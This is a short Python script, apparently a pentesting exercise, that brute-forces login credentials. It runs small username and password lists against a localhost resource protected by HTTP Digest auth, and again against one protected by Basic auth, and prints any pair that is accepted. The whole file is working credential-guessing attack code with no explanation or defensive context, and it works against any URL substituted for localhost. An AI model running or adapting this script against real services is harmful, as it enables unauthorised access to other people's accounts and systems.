#!/usr/bin/python3
import requests
from requests.auth import HTTPDigestAuth

users=['administrator', 'admin']
passwords=['administrator', 'admin123','admin']
protectedResource = 'http://localhost/digest-secured/'

foundPass = False
for user in users:
	if foundPass:
		break
	for passwd in passwords:
		res = requests.get(protectedResource)
		if res.status_code == 401:
			resDigest = requests.get(protectedResource, auth=HTTPDigestAuth(user, passwd))
			if resDigest.status_code == 200:
				print 'User Found...'
				print 'User: '+user+' Pass: '+passwd				
				foundPass = True


#AUTHENTICATE CLIENTS

import base64
import requests

users=['administrator', 'admin']
passwords=['admin123','admin']
protectedResource = 'http://localhost/secured'

foundPass = False
for user in users:
	if foundPass:
		break
	for passwd in passwords:
		encoded = base64.encodestring(user+':'+passwd)
		response = requests.get(protectedResource, auth=(user,passwd))
		if response.status_code != 401:
			print 'User Found!'
			print 'User: %s, Pass: %s' %(user,passwd)
			foundPass=True
			break
